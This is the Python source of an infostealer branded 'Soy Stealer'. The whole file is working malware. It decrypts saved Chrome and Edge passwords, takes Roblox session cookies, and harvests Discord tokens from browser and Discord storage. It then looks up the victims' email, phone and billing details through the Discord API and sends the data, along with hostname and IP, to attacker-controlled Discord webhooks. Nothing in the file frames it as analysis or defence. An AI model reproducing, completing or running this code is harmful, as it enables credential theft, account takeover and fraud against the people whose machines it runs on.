import os

# who reads this is gay
os.system("pip install browser_cookie3==0.16.2 && pip install colorama==0.4.4 && pip install PyAutoGUI==0.9.53 && pip install pycryptodome==3.15.0 && pip install pywin32==304 && pip install requests==2.25.1")


import socket
import base64
from colorama import *
import json
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import requests

import browser_cookie3
import requests
import socket

import re
import threading
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps


class config:
    webhook = "Webhook1"
    logger = "Webhook2"

class emoji:
    user = ":bust_in_silhouette:"
    computer = ":desktop:"
    alien = ":space_invader:"
    key = ":key:"
    cookie = ":cookie:"
    soy = ":custard:"
    mail = ":envelope:"
    globe = ":globe_with_meridians:"

class chrome_stealer:
    results = ""
    passwords52 = []
    FileName = 116444736000000000
    NanoSeconds = 10000000
    def ConvertDate(ft):
            utc = datetime.utcfromtimestamp(((10 * int(ft)) - chrome_stealer.FileName) / chrome_stealer.NanoSeconds)
            return utc.strftime('%Y-%m-%d %H:%M:%S')
    def get_master_key():
            try:
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                        "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
            except:
                pass
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)
    def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)
    def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = chrome_stealer.generate_cipher(master_key, iv)
                decrypted_pass = chrome_stealer.decrypt_payload(cipher, payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except Exception as e:
                return "Chrome < 80"
    def get_password():
            master_key = chrome_stealer.get_master_key()
            login_db = os.environ[
                        'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
            try:
                shutil.copy2(login_db,
                            "Loginvault.db")
            except:
                pass
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = chrome_stealer.decrypt_password(encrypted_password, master_key)
                    if username != "" or decrypted_password != "":
                        if url.strip() == "":
                            url = "Unknown"
                        uhbiore=f"[+] Url: " + url + f"\n[+] Username: " + username + f"\n[+] Password: " + decrypted_password + "\n\n"
                        chrome_stealer.passwords52.append(uhbiore)
            except Exception as e:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except Exception as e:
                pass

    def steal():
        try:
            chrome_stealer.get_password()
            stringvar = ""
            for i in range(len(chrome_stealer.passwords52)):
                stringvar = stringvar + chrome_stealer.passwords52[i]
            chrome_stealer.results += stringvar + "\n"
            if chrome_stealer.results.strip() == "":
                return "None"
            return chrome_stealer.results.strip()
        except:
            return "None"

class edge_stealer:
    results = ""
    passwords52 = []
    FileName = 116444736000000000
    NanoSeconds = 10000000
    def ConvertDate(ft):
            utc = datetime.utcfromtimestamp(((10 * int(ft)) - edge_stealer.FileName) / edge_stealer.NanoSeconds)
            return utc.strftime('%Y-%m-%d %H:%M:%S')
    def get_master_key():
            try:
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State',
                        "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
            except:
                pass
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)
    def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)
    def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = edge_stealer.generate_cipher(master_key, iv)
                decrypted_pass = edge_stealer.decrypt_payload(cipher, payload)
                decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
                return decrypted_pass
            except Exception as e:
                return "Chrome < 80"
    def get_password():
            master_key = edge_stealer.get_master_key()
            login_db = os.environ[
                        'USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            try:
                shutil.copy2(login_db,
                            "Loginvault.db")
            except:
                pass
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()

            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = edge_stealer.decrypt_password(encrypted_password, master_key)
                    if username != "" or decrypted_password != "":
                        if url.strip() == "":
                            url = "Unknown"
                        uhbiore=f"[+] Url: " + url + f"\n[+] Username: " + username + f"\n[+] Password: " + decrypted_password + "\n\n"
                        edge_stealer.passwords52.append(uhbiore)
            except Exception as e:
                pass

            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except Exception as e:
                pass

    def steal():
        try:
            edge_stealer.get_password()
            stringvar = ""
            for i in range(len(edge_stealer.passwords52)):
                stringvar = stringvar + edge_stealer.passwords52[i]
            edge_stealer.results += stringvar + "\n"
            if edge_stealer.results.strip() == "":
                return "None"
            return edge_stealer.results.strip()
        except:
            return "None"

class discord_stealer:
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp = os.getenv("TEMP")
    Threadlist = []

    Tokens = ''
    token_list = []

    class DATA_BLOB(Structure):
        _fields_ = [
            ('cbData', wintypes.DWORD),
            ('pbData', POINTER(c_char))
        ]

    def GetData(blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = discord_stealer.DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = discord_stealer.DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = discord_stealer.DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return discord_stealer.GetData(blob_out)

    def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

    def GetBilling(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        try:
            billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
        except:
            return False

        if billingjson == []: return " -"

        billing = ""
        for methode in billingjson:
            if methode["invalid"] == False:
                if methode["type"] == 1:
                    billing += ":credit_card:"
                elif methode["type"] == 2:
                    billing += ":parking: "

        return billing

    def GetBadge(flags):
        if flags == 0: return ''

        OwnedBadges = ''
        badgeList =  [
            {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
            {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
            {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
            {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
            {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
            {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
            {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
            {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
            {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
            {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
        ]

        for badge in badgeList:
            if flags // badge["Value"] != 0:
                OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]

        return OwnedBadges

    def GetTokenInfo(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
        username = userjson["username"]
        hashtag = userjson["discriminator"]
        email = userjson["email"]
        idd = userjson["id"]
        pfp = userjson["avatar"]
        flags = userjson["public_flags"]
        nitro = ""
        phone = "-"

        if "premium_type" in userjson:
            nitrot = userjson["premium_type"]
            if nitrot == 1:
                nitro = "<:classic:896119171019067423> "
            elif nitrot == 2:
                nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
        if "phone" in userjson: phone = f'`{userjson["phone"]}`'

        return username, hashtag, email, idd, pfp, flags, nitro, phone

    def checkToken(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        try:
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
            return True
        except:
            return False

    def Reformat(listt):
        e = re.findall("(\w+[a-z])",listt)
        while "https" in e: e.remove("https")
        while "com" in e: e.remove("com")
        while "net" in e: e.remove("net")
        return list(set(e))

    def getToken(path, arg):
        if not os.path.exists(path): return
        path += arg
        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                        for token in re.findall(regex, line):
                            if discord_stealer.checkToken(token):
                                if not token in discord_stealer.Tokens:
                                    discord_stealer.Tokens += token

    def GetDiscord(path, arg):
        if not os.path.exists(f"{path}/Local State"): return
        pathC = path + arg
        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = discord_stealer.CryptUnprotectData(master_key[5:])
        for file in os.listdir(pathC):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokenDecoded = discord_stealer.DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if discord_stealer.checkToken(tokenDecoded):
                            if not tokenDecoded in discord_stealer.Tokens:
                                discord_stealer.Tokens += tokenDecoded
                                discord_stealer.token_list.append(tokenDecoded)

    def GatherAll():
        browserPaths = [
            [f"{discord_stealer.roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{discord_stealer.roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{discord_stealer.roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{discord_stealer.local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{discord_stealer.local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{discord_stealer.local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{discord_stealer.local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
            [f"{discord_stealer.local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
        ]

        discordPaths = [
            [f"{discord_stealer.roaming}/Discord", "/Local Storage/leveldb"],
            [f"{discord_stealer.roaming}/Lightcord", "/Local Storage/leveldb"],
            [f"{discord_stealer.roaming}/discordcanary", "/Local Storage/leveldb"],
            [f"{discord_stealer.roaming}/discordptb", "/Local Storage/leveldb"],
        ]

        for patt in browserPaths:
            a = threading.Thread(target=discord_stealer.getToken, args=[patt[0], patt[2]])
            a.start()
            discord_stealer.Threadlist.append(a)
        for patt in discordPaths:
            a = threading.Thread(target=discord_stealer.GetDiscord, args=[patt[0], patt[1]])
            a.start()
            discord_stealer.Threadlist.append(a)

        for thread in discord_stealer.Threadlist:
            thread.join()
    
class roblox_stealer:
    cookies = "No Cookie*s found!"
    lcookies = []

    def edge_logger():
        try:
            cookies = browser_cookie3.edge(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            roblox_stealer.lcookies.append(cookie)
        except:
            pass

    def chrome_logger():
        try:
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            roblox_stealer.lcookies.append(cookie)
        except:
            pass

    def firefox_logger():
        try:
            cookies = browser_cookie3.firefox(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            roblox_stealer.lcookies.append(cookie)
        except:
            pass

    def opera_logger():
        try:
            cookies = browser_cookie3.opera(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            roblox_stealer.lcookies.append(cookie)
        except:
            pass

    def steal():
        roblox_stealer.edge_logger()
        roblox_stealer.chrome_logger()
        roblox_stealer.opera_logger()
        roblox_stealer.firefox_logger()

        cookies = roblox_stealer.cookies
        if roblox_stealer.lcookies.__len__() > 0:
            cookies = ""
            for ookie in roblox_stealer.lcookies:
                cookies += ookie + "\n"
            cookies = cookies[0:cookies.__len__() - 1]

        return cookies

class stealer:
    username = os.getlogin()
    hostname = socket.gethostname()
    ipaddress = requests.get("https://ifconfig.me").text
    header = f"""
{emoji.user} UserName.: {username}
{emoji.computer} HostName.: {hostname}
{emoji.alien} IPaddress: {ipaddress}
"""
    header = header[1:header.__len__()]

    Browser_Passwords = f"""---- Edge Passwords ----
{edge_stealer.steal()}

---- Chrome Passwords ----
{chrome_stealer.steal()}
"""
    Roblox_Cookie = roblox_stealer.steal()
    
    discord_stealer.GatherAll()
    Discord_tokens = discord_stealer.token_list

    def discord_log():
        result = ""

        if stealer.Discord_tokens.__len__() < 1:
            return "None"

        for token in stealer.Discord_tokens:
            username, hashtag, email, idd, pfp, flags, nitro, phone = discord_stealer.GetTokenInfo(token)
            if pfp == None:
                pfp = "https://cdn.discordapp.com/avatars/643945264868098049/c6a249645d46209f337279cd2ca998c7.png"
            else:
                pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
            billing = discord_stealer.GetBilling(token)
            badge = discord_stealer.GetBadge(flags)
            if not billing:
                badge, phone, billing = "-", "-", "-"
            if nitro == '' and badge == '': nitro = " -"

            result += f"""Username: {username}#{hashtag}
Token...: {token}
Email...: {email}
Phone...: {phone}
Billing.: {billing}
Nitro...: {nitro}{badge}\n"""

        return result[0:result.__len__() - 1]

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
}

pfp = "https://cdn.discordapp.com/avatars/643945264868098049/c6a249645d46209f337279cd2ca998c7.png"


account_embeds = []

blank_embed = {
    "color": 14406413,
    "fields": [
        {
            "name": f"{emoji.cookie} Token:",
            "value": f"`None`\n[Click to copy](None)"
        },
        {
           "name": f"{emoji.mail} Email:",
           "value": f"`None`",
           "inline": True
        },
        {
            "name": ":mobile_phone: Phone:",
            "value": f"None",
            "inline": True
        },
        {
            "name": f"{emoji.globe} IP:",
            "value": f"`None`",
            "inline": True
        },
        {
            "name": ":beginner: Badges:",
            "value": f"None",
            "inline": True
        },
        {
            "name": ":credit_card: Billing:",
            "value": f"None",
            "inline": True
        }
    ],
    "author": {
        "name": f"None#None (None)",
        "icon_url": f"{pfp}"
    },
    "footer": {
        "text": "@Soy Stealer",
        "icon_url": "https://media.discordapp.net/attachments/1003378352838680718/1043196399791128606/unknown.png"
    },
    "thumbnail": {
        "url": f"{pfp}"
    }
}

if stealer.Discord_tokens.__len__() == 0:
    account_embeds.append(blank_embed)

used_tokens = []
for token in stealer.Discord_tokens:
    if used_tokens.__contains__(token):
        continue
    used_tokens.append(token)

    username, hashtag, email, idd, pfp, flags, nitro, phone = discord_stealer.GetTokenInfo(token)
    if pfp == None:
        pfp = "https://cdn.discordapp.com/avatars/643945264868098049/c6a249645d46209f337279cd2ca998c7.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
    billing = discord_stealer.GetBilling(token)
    badge = discord_stealer.GetBadge(flags)
    if not billing:
        badge, phone, billing = "-", "-", "-"
    if nitro == '' and badge == '': nitro = " -"
    embed = {
    "color": 14406413,
    "fields": [
        {
            "name": f"{emoji.cookie} Token:",
            "value": f"`{token}`\n[Click to copy]({token})"
        },
        {
        "name": f"{emoji.mail} Email:",
        "value": f"`{email}`",
        "inline": True
        },
        {
            "name": ":mobile_phone: Phone:",
            "value": f"{phone}",
            "inline": True
        },
        {
            "name": f"{emoji.globe} IP:",
            "value": f"`{stealer.ipaddress}`",
            "inline": True
        },
        {
            "name": ":beginner: Badges:",
            "value": f"{nitro}{badge}",
            "inline": True
        },
        {
            "name": ":credit_card: Billing:",
            "value": f"{billing}",
            "inline": True
        }
    ],
    "author": {
        "name": f"{username}#{hashtag} ({idd})",
        "icon_url": f"{pfp}"
    },
    "footer": {
        "text": "@Soy Stealer",
        "icon_url": "https://media.discordapp.net/attachments/1003378352838680718/1043196399791128606/unknown.png"
    },
    "thumbnail": {
        "url": f"{pfp}"
    }
}

    account_embeds.append(embed)

embs = json.loads(json.dumps(account_embeds))

data = {
    "content": f'''

{emoji.soy} New User Logged

{emoji.user} UserName.: {stealer.username}
{emoji.computer} HostName.: {stealer.hostname}

{emoji.globe} IPAddress: {stealer.ipaddress}

{emoji.key} Browser Password*s
```
{stealer.Browser_Passwords}
```

{emoji.cookie} Roblox Cookie*s
```
{stealer.Roblox_Cookie}
```

:rocket: Discord Account*s
''',

"embeds": embs,
"avatar_url": "https://media.discordapp.net/attachments/1003378352838680718/1043196399791128606/unknown.png",
"username": "Soy Stealer",
"attachments": []
}

r = requests.post(headers=headers, json=data, url=config.webhook)


log_file = f"""
==============GENERAL=============
UserName.: {stealer.username}
HostName.: {stealer.hostname}
IPAddress: {stealer.ipaddress}
=========BROWSER-PASSWORDS========
{stealer.Browser_Passwords}
===========ROBLOX-COOKIE==========
{stealer.Roblox_Cookie}
==========DISCORD-ACCOUNTS========
{stealer.discord_log()}
==================================
"""

data_log = {
    "content": f"""
```
{log_file}
```    
""",
    "username": "SOYLOG"
}

r_logger = requests.post(headers=headers, json=data_log, url=config.logger)

# who reads this is gay
